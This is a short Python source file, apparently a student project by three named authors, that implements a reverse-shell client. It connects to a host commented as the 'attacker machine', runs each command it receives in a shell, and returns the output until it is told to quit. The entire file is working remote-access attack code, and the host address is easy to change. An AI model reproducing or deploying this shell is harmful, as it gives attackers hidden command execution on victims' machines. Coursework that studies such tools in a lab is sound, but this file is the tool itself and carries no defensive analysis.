# Aaron Stephen (TP041867), Ngo Hui Ann(TP04096), Soo Juson Moy(TP044863)

import socket
import subprocess

REMOTE_HOST = '127.0.0.1' # IP of attacker machine
REMOTE_PORT = 8081 # Port to match server
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    if (command == "Quit"):
        client.close()
        break
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)

client.close()
print("[-] Connection closed")